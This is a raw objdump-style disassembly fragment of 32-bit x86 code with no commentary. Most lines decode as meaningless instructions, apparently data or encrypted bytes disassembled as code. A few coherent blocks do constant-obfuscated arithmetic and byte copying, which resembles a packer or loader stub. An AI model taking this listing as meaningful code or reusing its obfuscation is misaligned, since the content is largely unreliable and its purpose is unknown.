  40d9c8:	cmp    bl,BYTE PTR [esi+0x65d5178a]
  40d9ce:	sub    DWORD PTR [edx+0x3c],esp
  40d9d1:	rcr    DWORD PTR [ecx+0x17e954d],1
  40d9d7:	sub    DWORD PTR [eax+edi*2+0x5f],ebp
  40d9db:	mov    esp,DWORD PTR [edx+0x25]
  40d9de:	aas    
  40d9df:	dec    ebx
  40d9e0:	or     DWORD PTR [eax+0x2b6d8ad8],ecx
  40d9e6:	ret    
  40d9e7:	sar    dl,cl
  40d9e9:	xchg   ecx,eax
  40d9ea:	push   cs
  40d9eb:	ja     0x40da20
  40d9ed:	jg     0x40da5f
  40d9ef:	xchg   edi,eax
  40d9f0:	mov    ds:0xac9836b3,eax
  40d9f5:	pop    ecx
  40d9f6:	xchg   edx,eax
  40d9f7:	test   al,0x9e
  40d9f9:	push   ecx
  40d9fa:	mov    ecx,0x634e7c4c
  40d9ff:	in     al,dx
  40da00:	add    al,0xa8
  40da02:	mov    ecx,DWORD PTR [edi+0x8d7f38b]
  40da08:	push   ds
  40da09:	popa   
  40da0a:	inc    edx
  40da0b:	mov    WORD PTR [ebx-0x10be7a80],?
  40da11:	pop    eax
  40da12:	sub    DWORD PTR [edi-0x80],0x19
  40da16:	popf   
  40da17:	imul   ecx,DWORD PTR [esp+ecx*1-0x67],0x4b
  40da1c:	push   es
  40da1d:	mov    al,0x44
  40da1f:	jl     0x40d9cf
  40da21:	mov    ebp,0x9f585364
  40da26:	dec    ebp
  40da27:	fld    DWORD PTR [edx]
  40da29:	mov    ebp,0x16eb05ac
  40da2e:	fisttp WORD PTR [ebx+0x25]
  40da31:	(bad)  
  40da32:	(bad)  
  40da33:	jns    0x40da42
  40da35:	lock repnz loopne 0x40daa8
  40da39:	loop   0x40da01
  40da3b:	mov    edx,0xb67494ec
  40da40:	push   0x1f0ab12f
  40da45:	cmp    eax,0xe04166ff
  40da4a:	hlt    
  40da4b:	mov    cl,0x38
  40da4d:	(bad)  
  40da4e:	push   esi
  40da4f:	test   al,0x78
  40da51:	xchg   ebx,ebp
  40da53:	and    ch,bl
  40da55:	sbb    ch,BYTE PTR [edx]
  40da57:	inc    edx
  40da58:	pop    es
  40da59:	jmp    0x40da60
  40da5b:	sbb    BYTE PTR [edx+0x71],bh
  40da5e:	sub    eax,0x1f062f35
  40da63:	imul   edx,DWORD PTR [ebp-0x7f],0x1a
  40da67:	ror    BYTE PTR [eax+0x18290cc9],1
  40da6d:	imul   edi
  40da6f:	retf   0x8c89
  40da72:	in     eax,dx
  40da73:	adc    edi,DWORD PTR [esp+ebx*2-0x6d]
  40da77:	push   es
  40da78:	and    DWORD PTR [edx-0x6d],esi
  40da7b:	inc    DWORD PTR [ecx]
  40da7d:	pop    ebx
  40da7e:	daa    
  40da7f:	jne    0x40daf8
  40da81:	mov    edi,0x11219082
  40da86:	mov    ss,WORD PTR [ebx+0x4f]
  40da89:	ins    BYTE PTR es:[edi],dx
  40da8a:	out    dx,al
  40da8b:	pop    edi
  40da8c:	add    BYTE PTR [edx],dh
  40da8e:	pop    esp
  40da8f:	sub    DWORD PTR [ebp-0x2f],esp
  40da92:	jns    0x40da6d
  40da94:	repz mov eax,ds:0x6c64c371
  40da9a:	sbb    BYTE PTR [edx],ah
  40da9c:	imul   ebp,DWORD PTR gs:0x4d187b9d,0x8829d9c
  40daa7:	lock adc bh,cl
  40daaa:	mov    dh,0x28
  40daac:	in     eax,0x33
  40daae:	sbb    al,0xaf
  40dab0:	inc    ecx
  40dab1:	and    edi,0xffffffca
  40dab4:	or     ah,BYTE PTR [ecx+0xcb2a397]
  40daba:	dec    ebp
  40dabb:	test   BYTE PTR [eax],bh
  40dabd:	stos   DWORD PTR es:[edi],eax
  40dabe:	call   0x178f:0x4b05b6f3
  40dac5:	sbb    eax,0x8dd106b6
  40daca:	inc    esp
  40dacb:	xor    DWORD PTR [ebp+0x25df5baa],esi
  40dad1:	or     DWORD PTR [edi+0x59f70881],esi
  40dad7:	dec    esp
  40dad8:	std    
  40dad9:	adc    ecx,DWORD PTR [ecx]
  40dadb:	mov    ds:0xe810ca3f,eax
  40dae0:	xor    ah,BYTE PTR es:[edx]
  40dae3:	int3   
  40dae4:	push   ecx
  40dae5:	jmp    0x12ca6977
  40daea:	sub    al,BYTE PTR [edx+0x66]
  40daed:	jns    0x40daf7
  40daef:	mov    eax,0xb2499897
  40daf4:	call   0x27c62865
  40daf9:	sbb    eax,DWORD PTR [edi-0x6]
  40dafc:	adc    DWORD PTR ds:0xb196da1,esp
  40db02:	mov    ds:0xfb6d4b0a,eax
  40db07:	xchg   edx,eax
  40db08:	mov    edx,0xeaeacba2
  40db0d:	mov    ch,BYTE PTR [eax+0x67fe4622]
  40db13:	adc    al,BYTE PTR ds:0xb44e0e4e
  40db19:	imul   esp,DWORD PTR [edi+0x4d2490d1],0xa898b7ed
  40db23:	lods   al,BYTE PTR ds:[esi]
  40db24:	mov    ebp,0x2079690e
  40db29:	out    0xa3,al
  40db2b:	mov    ?,WORD PTR [edi]
  40db2d:	add    eax,0x78
  40db30:	icebp  
  40db31:	mov    esi,ss
  40db33:	cmp    BYTE PTR [ecx+edi*4+0x19],dl
  40db37:	ficomp DWORD PTR [ecx+eax*4]
  40db3a:	pop    eax
  40db3b:	enter  0x73a8,0x17
  40db3f:	push   ebp
  40db40:	mov    dh,BYTE PTR [edi]
  40db42:	rcl    BYTE PTR [edi],0x8b
  40db45:	inc    ebp
  40db46:	or     BYTE PTR [ecx-0x37],ch
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dc10
  40db97:	es pop edi
  40db99:	jo     0x40dbf6
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [esi],bh
  40dba3:	and    esi,DWORD PTR [edi]
  40dba5:	imul   eax,DWORD PTR cs:[edx],0x1ee998a8
  40dbac:	(bad)  
  40dbad:	fprem1 
  40dbaf:	mov    edx,0xf9647a04
  40dbb4:	not    ecx
  40dbb6:	push   cs
  40dbb7:	retf   0x3fb
  40dbba:	xchg   ecx,eax
  40dbbb:	ds push 0x37
  40dbbe:	cwde   
  40dbbf:	mov    dh,0xb8
  40dbc1:	adc    DWORD PTR [edx+edx*1-0x43],eax
  40dbc5:	cmp    al,0xdd
  40dbc7:	(bad)  
  40dbc8:	xor    ch,BYTE PTR [ebp+0x5f12cb1e]
  40dbce:	cmp    al,0x7
  40dbd0:	fisub  WORD PTR [edi-0x75e064ce]
  40dbd6:	jne    0x40dbb0
  40dbd8:	lahf   
  40dbd9:	mov    ah,0x3d
  40dbdb:	ficom  WORD PTR [ebx+0x39]
  40dbde:	adc    ah,BYTE PTR [ecx]
  40dbe0:	inc    ebp
  40dbe1:	rcr    DWORD PTR [esi-0x4e],0x47
  40dbe5:	stc    
  40dbe6:	jmp    0xc017:0x17f1245
  40dbed:	das    
  40dbee:	cmp    BYTE PTR [edx],0xa2
  40dbf1:	jbe    0x40dc65
  40dbf3:	int3   
  40dbf4:	sub    DWORD PTR [edi-0x55702726],eax
  40dbfa:	test   al,0xee
  40dbfc:	jae    0x40dc4c
  40dbfe:	push   edi
  40dbff:	pop    ss
  40dc00:	xchg   esi,eax
  40dc01:	cmp    eax,0xe1f886af
  40dc06:	pop    esi
  40dc07:	dec    ebp
  40dc08:	pop    edx
  40dc09:	or     BYTE PTR [ebp+0x1452b218],cl
  40dc0f:	sti    
  40dc10:	add    BYTE PTR [edi+0x7aa54a3f],ah
  40dc16:	cmp    eax,0x18e27b63
  40dc1b:	sub    bh,BYTE PTR [eax]
  40dc1d:	fwait
  40dc1e:	sbb    BYTE PTR [ebx],cl
  40dc20:	retf   
  40dc21:	sbb    al,0x9f
  40dc23:	icebp  
  40dc24:	dec    edx
  40dc25:	int    0xab
  40dc27:	jecxz  0x40dbc7
  40dc29:	call   0xa9dd472a
  40dc2e:	xor    BYTE PTR [esi+0x61],cl
  40dc31:	xor    BYTE PTR [esi-0x4c],dl
  40dc34:	xchg   DWORD PTR [ecx-0x3b],edx
  40dc37:	fcomi  st,st(3)
  40dc39:	fadd   DWORD PTR [edx+0x2a]
  40dc3c:	cmp    ecx,DWORD PTR [ebp-0x7b]
  40dc3f:	jecxz  0x40dc21
  40dc41:	neg    BYTE PTR [edi+0x2f]
  40dc44:	mov    eax,0xa6d25ec8
  40dc49:	mov    eax,ds:0x147c00ad
  40dc4e:	push   eax
  40dc4f:	push   esp
  40dc50:	jmp    0x5031:0x660e366c
  40dc57:	mov    ds:0x64b19181,eax
  40dc5c:	cmp    cl,dl
  40dc5e:	add    BYTE PTR [esi+eax*1+0x5eb1c58f],ah
  40dc65:	dec    ebp
  40dc66:	mov    ds:0x2a71d276,al
  40dc6b:	pop    ss
  40dc6c:	out    dx,eax
  40dc6d:	outs   dx,BYTE PTR ds:[esi]
  40dc6e:	into   
  40dc6f:	sub    eax,0xaf978f2b
  40dc74:	pop    es
  40dc75:	hlt    
  40dc76:	test   BYTE PTR [ecx-0x7bce9a4e],cl
  40dc7c:	cmc    
  40dc7d:	xor    BYTE PTR [edx+0x49],ah
  40dc80:	pusha  
  40dc81:	into   
  40dc82:	sbb    eax,0x5786ad67
  40dc87:	xchg   esi,eax
  40dc88:	ret    0x4856
  40dc8b:	jne    0x40dc44
  40dc8d:	(bad)  
  40dc8e:	cmp    BYTE PTR [ebp-0x1469dc0d],cl
  40dc94:	mov    ebp,0x67e20a34
  40dc99:	dec    ebx
  40dc9a:	xchg   ecx,eax
  40dc9b:	retf   
  40dc9c:	xchg   BYTE PTR [edx-0x72],bh
  40dc9f:	outs   dx,DWORD PTR ds:[esi]
  40dca0:	mov    ebp,DWORD PTR ds:0xf635
  40dca5:	push   eax
  40dca6:	fdivr  DWORD PTR [ebx]
  40dca8:	std    
  40dca9:	rol    BYTE PTR ds:[esp+edi*4],cl
  40dcad:	pop    ebp
  40dcae:	cmp    DWORD PTR [ebx],ecx
  40dcb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb1:	sahf   
  40dcb2:	pushf  
  40dcb3:	jecxz  0x40dcc4
  40dcb5:	add    DWORD PTR [ebp+0x8802c73],ecx
  40dcbb:	adc    bh,dl
  40dcbd:	xchg   edx,eax
  40dcbe:	add    al,0x11
  40dcc0:	out    0xc,al
  40dcc2:	std    
  40dcc3:	sbb    BYTE PTR [edx+0xc],ch
  40dcc6:	jg     0x40dc4d
  40dcc8:	icebp  
  40dcc9:	or     DWORD PTR [eax+0x8],0xffffff87
  40dccd:	pop    eax
  40dcce:	adc    al,0x9c
  40dcd0:	cwde   
  40dcd1:	outs   dx,DWORD PTR ds:[esi]
  40dcd2:	or     eax,0x989d1d73
  40dcd7:	jg     0x40dc60
  40dcd9:	in     eax,0x63
  40dcdb:	adc    dl,dh
  40dcdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcde:	dec    esp
  40dcdf:	mov    edi,0xcfa114d7
  40dce4:	call   0x8b9f852f
  40dce9:	push   cs
  40dcea:	sub    al,0x77
  40dcec:	rol    BYTE PTR [edx+0x70],cl
  40dcef:	and    eax,0x772931b1
  40dcf4:	mov    BYTE PTR [edi-0x33],ch
  40dcf7:	xor    BYTE PTR [edx-0x73],0x92
  40dcfb:	repz push 0x3f
  40dcfe:	call   0x7f601256
  40dd03:	outs   dx,DWORD PTR ds:[esi]
  40dd04:	cmp    eax,0xf1739cd9
  40dd09:	xchg   ebx,eax
  40dd0a:	xchg   ebx,eax
  40dd0b:	pop    ebx
  40dd0c:	mov    eax,ds:0xe914bd60
  40dd11:	xor    al,0xda
  40dd13:	jno    0x40dc99
  40dd15:	(bad)  
  40dd17:	ret    
  40dd18:	mov    ebx,0x348f3188
  40dd1d:	repz jno 0x40dce1
  40dd20:	fwait
  40dd21:	aaa    
  40dd22:	sahf   
  40dd23:	popa   
  40dd24:	out    dx,al
  40dd25:	cmp    BYTE PTR [edi],cl
  40dd27:	mov    es,esi
  40dd29:	rcr    BYTE PTR [eax],cl
  40dd2b:	out    dx,al
  40dd2c:	dec    edi
  40dd2d:	push   esp
  40dd2e:	add    DWORD PTR [ecx],0xffffffca
  40dd31:	xchg   edx,eax
  40dd32:	pop    esi
  40dd33:	xor    eax,0xad87aad9
  40dd38:	mov    dh,0x5d
  40dd3a:	mov    esp,0x4247bbc0
  40dd3f:	outs   dx,DWORD PTR ds:[esi]
  40dd40:	addr16 ja 0x40dd45
  40dd43:	xchg   edi,eax
  40dd44:	xor    eax,0x8c5050bc
  40dd49:	sahf   
  40dd4a:	mov    WORD PTR [ebx],ss
  40dd4c:	mov    dh,0x44
  40dd4e:	loopne 0x40dcde
  40dd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd51:	cmp    ebx,ebx
  40dd53:	into   
  40dd54:	nop
  40dd55:	shl    BYTE PTR [ecx],cl
  40dd57:	jo     0x40dd2c
  40dd59:	(bad)  
  40dd5a:	jecxz  0x40dd5b
  40dd5c:	ret    0x887a
  40dd5f:	cdq    
  40dd60:	xor    DWORD PTR [edx],esi
  40dd62:	out    0x81,eax
  40dd64:	jp     0x40dd1e
  40dd66:	pushf  
  40dd67:	mov    dl,0xb8
  40dd69:	mov    esp,0x42639186
  40dd6e:	stc    
  40dd6f:	out    0x27,al
  40dd71:	scas   eax,DWORD PTR es:[edi]
  40dd72:	out    0x7e,al
  40dd74:	jne    0x40dd95
  40dd76:	lock sbb dh,BYTE PTR [edx-0x49]
  40dd7a:	fcom   DWORD PTR [eax-0x432e7720]
  40dd80:	clc    
  40dd81:	lock (bad) 
  40dd83:	and    bl,BYTE PTR ss:[ebx]
  40dd86:	adc    ch,bh
  40dd88:	icebp  
  40dd89:	mov    ?,WORD PTR ds:0x5f089657
  40dd8f:	(bad)  
  40dd90:	mov    ds,esp
  40dd92:	repnz adc esi,DWORD PTR [ebp-0x3]
  40dd96:	cli    
  40dd97:	xchg   DWORD PTR [esi-0x4752aca9],edx
  40dd9d:	push   ss
  40dd9e:	mov    BYTE PTR [edi+esi*4+0x68401215],dl
  40dda5:	sbb    edi,DWORD PTR [eax-0x8f9c612]
  40ddab:	jns    0x40dd53
  40ddad:	push   cs
  40ddae:	sbb    eax,0xae7223a6
  40ddb3:	xor    eax,0xff4b02e1
  40ddb8:	dec    ecx
  40ddb9:	arpl   WORD PTR [esi-0x5d2f9669],dx
  40ddbf:	and    eax,0xc3b45d1b
  40ddc4:	jp     0x40ddd1
  40ddc6:	mov    al,0xce
  40ddc8:	test   ebx,eax
  40ddca:	(bad)  
  40ddcb:	gs push 0xffffffb8
  40ddce:	imul   edx,DWORD PTR [esp+ebx*1+0x38],0x6c760d0a
  40ddd6:	or     al,0xf8
  40ddd8:	fild   DWORD PTR [ebx]
  40ddda:	enter  0x26b3,0x9
  40ddde:	(bad)  
  40dddf:	xor    ecx,ebp
  40dde1:	inc    edi
  40dde2:	lods   eax,DWORD PTR ds:[esi]
  40dde3:	mov    ecx,0xddfd3a9a
  40dde8:	adc    DWORD PTR [edx],edx
  40ddea:	inc    esi
  40ddeb:	ins    DWORD PTR es:[edi],dx
  40ddec:	cmp    ecx,edi
  40ddee:	cmp    BYTE PTR [edx+0x55],dh
  40ddf1:	hlt    
  40ddf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddf3:	mov    edi,0xcc2c2744
  40ddf8:	dec    ebp
  40ddf9:	out    dx,eax
  40ddfa:	pop    ebp
  40ddfb:	sub    bh,dl
  40ddfd:	mov    al,0xcc
  40ddff:	mov    bh,0xe5
  40de01:	out    0x22,al
  40de03:	and    al,0x57
  40de05:	jle    0x40de14
  40de07:	arpl   WORD PTR [esi],si
  40de09:	push   0xfffffffc
  40de0b:	or     ecx,esp
  40de0d:	aas    
  40de0e:	jle    0x40dde9
  40de10:	push   edi
  40de11:	imul   BYTE PTR [ecx+esi*8+0x22b38d69]
  40de18:	loope  0x40de43
  40de1a:	mov    ds:0x2be2c2ad,eax
  40de1f:	or     eax,0x214d2227
  40de24:	push   edx
  40de25:	jo     0x40de36
  40de27:	add    eax,0xbab31df1
  40de2c:	jle    0x40ddd1
  40de2e:	mov    DWORD PTR [eax-0x456299db],ecx
  40de34:	cmp    al,0x73
  40de36:	enter  0xd7f0,0xda
  40de3a:	cmp    dl,ah
  40de3c:	jg     0x40ddf7
  40de3e:	mov    bl,BYTE PTR [esi-0xd]
  40de41:	in     eax,0x2a
  40de43:	in     al,0x6c
  40de45:	inc    edi
  40de46:	xlat   BYTE PTR ds:[ebx]
  40de47:	out    0x24,al
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422598
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de79
  40deca:	add    DWORD PTR [ebp+0x70],ebx
  40decd:	adc    al,0xcc
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [edi],ah
  40ded6:	mov    esp,0x27912e21
  40dedb:	and    eax,0x337aa337
  40dee0:	inc    esp
  40dee1:	mov    edi,0x2cb08fff
  40dee6:	pop    ss
  40dee7:	xchg   ebp,eax
  40dee8:	idiv   DWORD PTR [edi-0x64]
  40deeb:	push   DWORD PTR [edi-0x44]
  40deee:	aaa    
  40deef:	sub    ecx,DWORD PTR [esi-0x3d38e15a]
  40def5:	lds    ebp,FWORD PTR [edx+0x19e55b5d]
  40defb:	test   al,0x5f
  40defd:	aad    0xd2
  40deff:	adc    bl,BYTE PTR [ecx+0xf]
  40df02:	jnp    0x40debd
  40df04:	cmp    DWORD PTR ss:[ebx],eax
  40df07:	icebp  
  40df08:	ja     0x40deb4
  40df0a:	rcl    DWORD PTR [esi+ebx*8-0x465549ce],1
  40df11:	adc    ebx,esp
  40df13:	pushf  
  40df14:	leave  
  40df15:	or     BYTE PTR [eax+0x1a099112],al
  40df1b:	jns    0x40defd
  40df1d:	sbb    DWORD PTR [edx-0x29],eax
  40df20:	call   0xf72b60f4
  40df25:	es retf 
  40df27:	in     al,0x24
  40df29:	xchg   ebx,eax
  40df2a:	jg     0x40df58
  40df2c:	out    dx,al
  40df2d:	sub    al,BYTE PTR [eax+0x5cde1d8d]
  40df33:	out    dx,eax
  40df34:	cli    
  40df35:	test   edi,0x351e8935
  40df3b:	mov    eax,0x14cbe82a
  40df40:	fs mov esi,0x7f53921c
  40df46:	push   edx
  40df47:	add    al,0x91
  40df49:	sub    dh,BYTE PTR [ecx-0x77]
  40df4c:	inc    ebx
  40df4d:	je     0x40df16
  40df4f:	xor    esi,DWORD PTR [esp+ecx*4]
  40df52:	and    eax,edi
  40df54:	cs xchg ebx,eax
  40df56:	jo     0x40df39
  40df58:	jge    0x40df8e
  40df5a:	add    DWORD PTR [ebx+0x585303d7],edx
  40df60:	ja     0x40df36
  40df62:	jle    0x40df82
  40df64:	stos   DWORD PTR es:[edi],eax
  40df65:	out    dx,al
  40df66:	jb     0x40df11
  40df68:	in     eax,dx
  40df69:	in     eax,dx
  40df6a:	add    eax,ebp
  40df6c:	cmp    dl,BYTE PTR [ebx+0x10b9c597]
  40df72:	dec    ebx
  40df73:	cs jge 0x40df5d
  40df76:	xchg   BYTE PTR [esi],ah
  40df78:	gs push ss
  40df7a:	xchg   ebx,eax
  40df7b:	(bad)  
  40df7d:	cli    
  40df7e:	jle    0x40dfe0
  40df80:	mov    ds:0x9df1100b,al
  40df85:	push   ebx
  40df86:	(bad)  
  40df87:	adc    ch,BYTE PTR [edi+0x79]
  40df8a:	inc    edx
  40df8b:	sbb    eax,0xa667cef0
  40df90:	mov    al,ds:0x3c40e8eb
  40df95:	inc    eax
  40df96:	dec    edi
  40df97:	retf   0x8026
  40df9a:	sub    eax,0x590eed65
  40df9f:	xchg   edx,eax
  40dfa0:	jns    0x40df4e
  40dfa2:	xor    BYTE PTR [ecx-0x30d0726],0xcc
  40dfa9:	push   eax
  40dfaa:	mov    dh,0x28
  40dfac:	ss sub al,0x2
  40dfaf:	outs   dx,DWORD PTR ds:[esi]
  40dfb0:	sbb    DWORD PTR [eax-0x2fcb769a],edi
  40dfb6:	test   DWORD PTR [esi+edx*2],esp
  40dfb9:	scas   al,BYTE PTR es:[edi]
  40dfba:	add    BYTE PTR [edi+eiz*8+0x16ebfc50],0xf6
  40dfc2:	rcr    dh,cl
  40dfc4:	js     0x40dff7
  40dfc6:	ins    BYTE PTR es:[edi],dx
  40dfc7:	stc    
  40dfc8:	addr16 inc ebp
  40dfca:	dec    ebx
  40dfcb:	pop    ecx
  40dfcc:	ret    
  40dfcd:	cmp    BYTE PTR [eax],ah
  40dfcf:	pop    ebp
  40dfd0:	(bad)  
  40dfd1:	call   0x9f906e2b
  40dfd6:	mov    ebp,0x90965ee6
  40dfdb:	mov    ah,0xb
  40dfdd:	adc    BYTE PTR [eax+0x7df0c2e],cl
  40dfe3:	or     DWORD PTR [eax-0x55],0xffffffca
  40dfe7:	xchg   ebp,eax
  40dfe8:	out    0x73,eax
  40dfea:	sbb    ch,BYTE PTR [eax-0x1e]
  40dfed:	retf   
  40dfee:	jmp    0x76e9:0x7556e173
  40dff5:	xor    ecx,esi
  40dff7:	bound  edx,QWORD PTR [ecx]
  40dff9:	hlt    
  40dffa:	push   eax
  40dffb:	push   esi
  40dffc:	test   DWORD PTR [ecx-0x1ed19a94],0xe178d7c
  40e006:	fwait
  40e007:	jno    0x40e00a
  40e009:	cli    
  40e00a:	in     eax,0x10
  40e00c:	push   eax
  40e00d:	in     al,dx
  40e00e:	les    ecx,FWORD PTR [esi-0x7d]
  40e011:	lds    edx,FWORD PTR [eax-0x27]
  40e014:	inc    esi
  40e015:	dec    eax
  40e016:	push   ebp
  40e017:	cdq    
  40e018:	fldenv [esi-0x6a]
  40e01b:	cmp    BYTE PTR [eax-0x44],al
  40e01e:	mov    ch,0x90
  40e020:	sub    DWORD PTR [ecx-0x78],edx
  40e023:	ja     0x40e059
  40e025:	jge    0x40e061
  40e027:	test   eax,0x619c5ec4
  40e02c:	dec    edi
  40e02d:	(bad)  
  40e02e:	fcomp  QWORD PTR [ecx]
  40e030:	aas    
  40e031:	xor    ecx,DWORD PTR [edx]
  40e033:	jg     0x40dfcf
  40e035:	push   ss
  40e036:	(bad)
  40e03a:	jnp    0x40e061
  40e03c:	mov    WORD PTR [edx],cs
  40e03e:	adc    eax,0x72db8762
  40e043:	js     0x40dfeb
  40e045:	mov    bh,0xd2
  40e047:	and    eax,0xac58e7fd
  40e04c:	ins    DWORD PTR es:[edi],dx
  40e04d:	popf   
  40e04e:	and    eax,0xceae1d12
  40e053:	lock call 0xcb7c0dfc
  40e059:	xchg   esi,eax
  40e05a:	xchg   ebp,eax
  40e05b:	out    dx,eax
  40e05c:	mov    edi,0xe3e4eb30
  40e061:	jmp    0x40e05b
  40e063:	or     dl,al
  40e065:	rol    DWORD PTR [edx-0x1d935f9c],0x3b
  40e06c:	lods   al,BYTE PTR ds:[esi]
  40e06d:	xchg   esi,eax
  40e06e:	data16 mov al,0xf5
  40e071:	jmp    0xdcf1a812
  40e076:	jne    0x40e07e
  40e078:	repnz push edx
  40e07a:	and    al,0xa2
  40e07c:	and    al,ch
  40e07e:	mov    ds:0x4f05a34a,al
  40e083:	xchg   ebp,eax
  40e084:	in     eax,0xba
  40e086:	sahf   
  40e087:	mov    ch,0xf5
  40e089:	and    DWORD PTR [ecx-0x631db7b2],esi
  40e08f:	out    dx,eax
  40e090:	fcom   st(6)
  40e092:	push   esi
  40e093:	mov    bh,0x4b
  40e095:	mov    bl,0xce
  40e097:	(bad)  
  40e098:	inc    eax
  40e099:	mov    ds:0x30df6162,al
  40e09e:	sub    eax,ebp
  40e0a0:	fld    TBYTE PTR [ecx+0x5a]
  40e0a3:	cmp    eax,ebp
  40e0a5:	(bad)  
  40e0a6:	push   ss
  40e0a7:	ins    BYTE PTR es:[edi],dx
  40e0a8:	sub    eax,0x9c12916b
  40e0ad:	(bad)  
  40e0ae:	or     eax,0xbe05f525
  40e0b3:	push   esp
  40e0b4:	call   FWORD PTR [ecx]
  40e0b6:	dec    edi
  40e0b7:	add    edi,ecx
  40e0b9:	enter  0x78c3,0x1f
  40e0bd:	jbe    0x40e0a5
  40e0bf:	pop    es
  40e0c0:	mov    dh,BYTE PTR [edi-0x284e9d49]
  40e0c6:	aas    
  40e0c7:	(bad)
  40e0cb:	jnp    0x40e07b
  40e0cd:	inc    edx
  40e0ce:	inc    esp
  40e0cf:	jmp    0x40e0e3
  40e0d1:	cmp    BYTE PTR [edx],dl
  40e0d3:	mov    edx,0x40213c24
  40e0d8:	add    eax,0xd3243a5a
  40e0dd:	pop    eax
  40e0de:	or     al,0xe7
  40e0e0:	cmp    ah,BYTE PTR [ecx+0x16]
  40e0e3:	idiv   DWORD PTR [edi]
  40e0e5:	jno    0x40e0ef
  40e0e7:	inc    esi
  40e0e8:	xor    al,0x98
  40e0ea:	fs repnz or al,0x2a
  40e0ee:	je     0x40e15a
  40e0f0:	leave  
  40e0f1:	dec    ebp
  40e0f2:	aad    0x9c
  40e0f4:	(bad)  
  40e0f6:	std    
  40e0f7:	or     DWORD PTR cs:[edx+0x2],edx
  40e0fb:	pop    ecx
  40e0fc:	jl     0x40e16d
  40e0fe:	out    dx,eax
  40e0ff:	fldz   
  40e101:	(bad)  
  40e102:	xchg   ecx,eax
  40e103:	pop    esp
  40e104:	adc    esp,ebp
  40e106:	gs into 
  40e108:	leave  
  40e109:	aam    0xcd
  40e10b:	mov    edx,0x327b6f5d
  40e110:	sti    
  40e111:	cmp    bh,BYTE PTR [eax+0x5e84019a]
  40e117:	add    al,0x10
  40e119:	add    al,bl
  40e11b:	jnp    0x40e11a
  40e11d:	in     eax,0xc4
  40e11f:	repnz daa 
  40e121:	and    al,0x35
  40e123:	jno    0x40e0e9
  40e125:	adc    dl,BYTE PTR [ecx]
  40e127:	ror    BYTE PTR [edi+0x398b171d],1
  40e12d:	cmc    
  40e12e:	pop    edi
  40e12f:	cmp    DWORD PTR [ecx],ebx
  40e131:	mov    ebx,ebx
  40e133:	imul   ebp,ebx,0xcc174b86
  40e139:	in     eax,0x60
  40e13b:	push   ecx
  40e13c:	cwde   
  40e13d:	vhaddps xmm1,xmm4,XMMWORD PTR [eax-0x3249ab10]
  40e145:	jbe    0x40e0f1
  40e147:	dec    DWORD PTR [esi-0x42]
  40e14a:	xchg   BYTE PTR [eax],ch
  40e14c:	push   es
  40e14d:	and    dl,al
  40e14f:	cmp    dl,BYTE PTR [esp+esi*8]
  40e152:	cdq    
  40e153:	in     al,dx
  40e154:	inc    eax
  40e155:	std    
  40e156:	aam    0x4a
  40e158:	int3   
  40e159:	aas    
  40e15a:	mov    ebp,0x7cf3bb03
  40e15f:	cmp    al,0x2
  40e161:	bound  ecx,QWORD PTR [edx-0x6b1fe292]
  40e167:	std    
  40e168:	pop    edi
  40e169:	neg    BYTE PTR [edx+0x7d649510]
  40e16f:	pusha  
  40e170:	daa    
  40e171:	inc    eax
  40e172:	adc    eax,0xedb7bad6
  40e177:	inc    eax
  40e178:	(bad)  
  40e179:	sti    
  40e17a:	aaa    
  40e17b:	lods   al,BYTE PTR ds:[esi]
  40e17c:	mov    eax,DWORD PTR [ebp-0x10]
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
